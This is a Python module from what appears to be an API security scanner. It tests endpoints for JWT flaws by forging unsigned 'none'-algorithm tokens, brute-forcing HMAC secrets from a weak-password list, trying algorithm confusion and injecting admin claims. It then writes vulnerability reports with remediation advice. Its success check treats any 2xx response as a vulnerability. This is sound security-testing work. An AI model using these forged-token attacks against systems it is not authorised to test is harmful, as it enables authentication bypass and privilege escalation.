"""
JWT (JSON Web Token) vulnerability testing module.

Tests API endpoints for JWT vulnerabilities including:
- None algorithm attack
- Algorithm confusion
- Weak secret cracking
- Token manipulation
"""

import time
import json
import base64
import hashlib
import hmac
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Severity,
    Vulnerability,
    JWTResult
)


class JWTAttacker:
    """Performs JWT vulnerability testing on API endpoints."""
    
    # Common weak secrets for testing
    WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "key",
        "jwt",
        "token",
        "auth",
        "private",
        "privatekey",
        "secret_key",
        "secretkey",
        "jwt_secret",
        "jwtsecret",
        "pass",
        "passwd",
        "password123",
        "12345678",
        "qwerty",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "login",
        "abc123",
        "",
        " ",
        "HS256",
        "RS256",
    ]
    
    # Common JWT header variations
    HEADER_VARIATIONS = [
        # None algorithm
        {"alg": "none", "typ": "JWT"},
        {"alg": "None", "typ": "JWT"},
        {"alg": "NONE", "typ": "JWT"},
        {"alg": "nOnE", "typ": "JWT"},
        {"alg": "", "typ": "JWT"},
        
        # Algorithm confusion
        {"alg": "HS256", "typ": "JWT"},
        {"alg": "RS256", "typ": "JWT"},
        {"alg": "HS384", "typ": "JWT"},
        {"alg": "HS512", "typ": "JWT"},
        {"alg": "ES256", "typ": "JWT"},
    ]
    
    # Admin payload variations
    ADMIN_PAYLOADS = [
        {"sub": "admin", "role": "admin", "iat": 1234567890},
        {"sub": "administrator", "role": "admin", "iat": 1234567890},
        {"user": "admin", "role": "admin", "iat": 1234567890},
        {"username": "admin", "role": "administrator", "iat": 1234567890},
        {"id": 1, "role": "admin", "iat": 1234567890},
        {"sub": "admin", "admin": True, "iat": 1234567890},
    ]
    
    def __init__(self, target_url: str, timeout: int = 5):
        """Initialize the JWT attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/2.0.0 Security Scanner',
            'Accept': 'application/json'
        })
    
    def attack(self, endpoint: Endpoint, auth_token: Optional[str] = None) -> list[AttackResult]:
        """Perform JWT vulnerability tests.
        
        Args:
            endpoint: The endpoint to test
            auth_token: Valid JWT token to analyze and manipulate
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # If we have a token, analyze and attack it
        if auth_token:
            token = self._extract_token(auth_token)
            if token:
                results.extend(self._test_none_algorithm(endpoint, token))
                results.extend(self._test_algorithm_confusion(endpoint, token))
                results.extend(self._test_weak_secret(endpoint, token))
                results.extend(self._test_payload_manipulation(endpoint, token))
        else:
            # Test without token - check if endpoint accepts manipulated JWTs
            results.extend(self._test_no_token_jwt(endpoint))
        
        return results
    
    def _extract_token(self, auth_header: str) -> Optional[str]:
        """Extract JWT token from Authorization header."""
        if auth_header.startswith('Bearer '):
            return auth_header[7:]
        return auth_header
    
    def _decode_jwt(self, token: str) -> tuple[dict, dict, str]:
        """Decode JWT and return header, payload, and signature.
        
        Returns:
            Tuple of (header, payload, signature_base64)
        """
        parts = token.split('.')
        if len(parts) != 3:
            return {}, {}, ""
        
        try:
            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            
            return header, payload, parts[2]
        except Exception:
            return {}, {}, ""
    
    def _encode_jwt(self, header: dict, payload: dict, signature: str = "") -> str:
        """Encode JWT from header and payload."""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        return f"{header_b64}.{payload_b64}.{signature}"
    
    def _test_none_algorithm(self, endpoint: Endpoint, token: str) -> list[AttackResult]:
        """Test none algorithm attack."""
        results = []
        
        header, payload, _ = self._decode_jwt(token)
        if not header or not payload:
            return results
        
        # Test various none algorithm variations
        for none_header in self.HEADER_VARIATIONS[:5]:  # First 5 are none variants
            if none_header.get('alg', '').lower() not in ['none', '']:
                continue
            
            # Create token with admin payload
            admin_payload = payload.copy()
            admin_payload['role'] = 'admin'
            admin_payload['sub'] = 'admin'
            
            # Create token with empty signature
            forged_token = self._encode_jwt(none_header, admin_payload, "")
            
            result = self._test_token(endpoint, forged_token, "None algorithm attack")
            if result.success:
                result.extra_data = {'jwt_vuln_type': 'none_algorithm'}
            results.append(result)
        
        return results
    
    def _test_algorithm_confusion(self, endpoint: Endpoint, token: str) -> list[AttackResult]:
        """Test algorithm confusion attack."""
        results = []
        
        header, payload, _ = self._decode_jwt(token)
        if not header or not payload:
            return results
        
        # Test HS256 to RS256 confusion
        # This is a simplified test - full implementation would need RSA public key
        confusion_headers = [
            {"alg": "HS256", "typ": "JWT"},
        ]
        
        for test_header in confusion_headers:
            admin_payload = payload.copy()
            admin_payload['role'] = 'admin'
            
            # Test with weak secret (in case of algorithm confusion)
            for secret in self.WEAK_SECRETS[:5]:
                forged_token = self._sign_jwt(test_header, admin_payload, secret)
                result = self._test_token(endpoint, forged_token, f"Algorithm confusion with secret '{secret}'")
                results.append(result)
                
                if result.success:
                    result.extra_data = {'jwt_vuln_type': 'algorithm_confusion', 'secret': secret}
                    break
        
        return results
    
    def _test_weak_secret(self, endpoint: Endpoint, token: str) -> list[AttackResult]:
        """Test for weak JWT secret."""
        results = []
        
        header, payload, sig = self._decode_jwt(token)
        if not header or not payload:
            return results
        
        algorithm = header.get('alg', 'HS256')
        
        # Only test for HMAC algorithms
        if not algorithm.startswith('HS'):
            return results
        
        for secret in self.WEAK_SECRETS:
            # Try to verify the token with this secret
            if self._verify_jwt_signature(token, secret, algorithm):
                # Found the secret!
                # Create admin token
                admin_payload = payload.copy()
                admin_payload['role'] = 'admin'
                
                forged_token = self._sign_jwt(header, admin_payload, secret)
                result = self._test_token(endpoint, forged_token, f"Weak secret: '{secret}'")
                result.success = True
                result.extra_data = {'jwt_vuln_type': 'weak_secret', 'secret': secret}
                results.append(result)
                break
        
        return results
    
    def _test_payload_manipulation(self, endpoint: Endpoint, token: str) -> list[AttackResult]:
        """Test payload manipulation without signature verification."""
        results = []
        
        header, payload, sig = self._decode_jwt(token)
        if not header or not payload:
            return results
        
        # Test various admin payloads
        for admin_payload in self.ADMIN_PAYLOADS[:3]:
            # Merge with original payload
            test_payload = payload.copy()
            test_payload.update(admin_payload)
            
            # Create token (keep original signature - tests signature verification)
            forged_token = self._encode_jwt(header, test_payload, sig)
            
            result = self._test_token(endpoint, forged_token, "Payload manipulation")
            if result.success:
                result.extra_data = {'jwt_vuln_type': 'payload_manipulation'}
            results.append(result)
        
        return results
    
    def _test_no_token_jwt(self, endpoint: Endpoint) -> list[AttackResult]:
        """Test JWT acceptance without valid token."""
        results = []
        
        # Test with completely fabricated admin token
        for admin_payload in self.ADMIN_PAYLOADS[:2]:
            for header in self.HEADER_VARIATIONS[:3]:
                # Create unsigned admin token
                token = self._encode_jwt(header, admin_payload, "")
                
                result = self._test_token(endpoint, token, "Fabricated admin token")
                results.append(result)
        
        return results
    
    def _sign_jwt(self, header: dict, payload: dict, secret: str) -> str:
        """Sign a JWT with HMAC."""
        algorithm = header.get('alg', 'HS256')
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        message = f"{header_b64}.{payload_b64}"
        
        # Sign based on algorithm
        if algorithm == 'HS256':
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        elif algorithm == 'HS384':
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
        elif algorithm == 'HS512':
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
        else:
            signature = b''
        
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        
        return f"{message}.{sig_b64}"
    
    def _verify_jwt_signature(self, token: str, secret: str, algorithm: str = 'HS256') -> bool:
        """Verify JWT signature against a secret."""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        message = f"{parts[0]}.{parts[1]}"
        sig_provided = parts[2]
        
        # Calculate expected signature
        if algorithm == 'HS256':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        elif algorithm == 'HS384':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
        elif algorithm == 'HS512':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
        else:
            return False
        
        expected_sig_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b'=').decode()
        
        # Constant-time comparison
        return hmac.compare_digest(sig_provided, expected_sig_b64)
    
    def _test_token(self, endpoint: Endpoint, token: str, attack_type: str) -> AttackResult:
        """Test a forged JWT token against an endpoint."""
        start_time = time.time()
        
        try:
            url = f"{self.target_url}{endpoint.path}"
            headers = {'Authorization': f'Bearer {token}'}
            
            response = self.session.request(
                endpoint.method.value,
                url,
                headers=headers,
                timeout=self.timeout
            )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check if token was accepted
            is_vulnerable = self._check_jwt_success(response)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.JWT,
                success=is_vulnerable,
                payload=f"{attack_type}: {token[:50]}...",
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms
            )
            
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.JWT,
                success=False,
                payload=attack_type,
                error_message=str(e)
            )
    
    def _check_jwt_success(self, response: requests.Response) -> bool:
        """Check if JWT attack was successful."""
        # Success status codes
        if response.status_code in [200, 201, 202, 204]:
            return True
        
        # Check for admin-specific content
        admin_indicators = ['admin', 'administrator', 'role', 'privilege', 'dashboard']
        response_text = response.text.lower()
        
        for indicator in admin_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def create_vulnerability(self, result: AttackResult, endpoint: Endpoint) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        vuln_type = 'unknown'
        secret = None
        
        if result.extra_data:
            vuln_type = result.extra_data.get('jwt_vuln_type', 'unknown')
            secret = result.extra_data.get('secret')
        
        severity_map = {
            'weak_secret': Severity.HIGH,
            'none_algorithm': Severity.CRITICAL,
            'algorithm_confusion': Severity.HIGH,
            'payload_manipulation': Severity.HIGH,
        }
        
        severity = severity_map.get(vuln_type, Severity.HIGH)
        
        description = {
            'weak_secret': f"JWT is signed with a weak secret: '{secret}'. Attackers can forge valid tokens.",
            'none_algorithm': "JWT library accepts 'none' algorithm, allowing unsigned tokens.",
            'algorithm_confusion': "JWT is vulnerable to algorithm confusion attack.",
            'payload_manipulation': "JWT signature is not properly verified.",
        }
        
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.JWT,
            severity=severity,
            title=f"JWT Vulnerability ({vuln_type}) in {endpoint.full_path}",
            description=description.get(vuln_type, "JWT vulnerability detected."),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Attack Type: {vuln_type}\n"
                f"Forged Token: {result.payload}\n"
                f"Response Status: {result.response_status}"
            ),
            recommendation=(
                "1. Use strong, random secrets for JWT signing (256+ bits)\n"
                "2. Reject 'none' algorithm explicitly\n"
                "3. Use RS256 (asymmetric) instead of HS256 for public APIs\n"
                "4. Validate algorithm in header matches expected\n"
                "5. Implement proper key rotation\n"
                "6. Use short token expiration times\n"
                "7. Store tokens securely (httpOnly, secure cookies)"
            ),
            cwe_id="CWE-287",
            owasp_category="A07:2021 - Identification and Authentication Failures",
            response_evidence=result.response_body,
            cvss_score=9.1 if vuln_type == 'none_algorithm' else 8.1,
            references=[
                "https://owasp.org/www-community/vulnerabilities/JSON_Web_Token",
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
            ]
        )
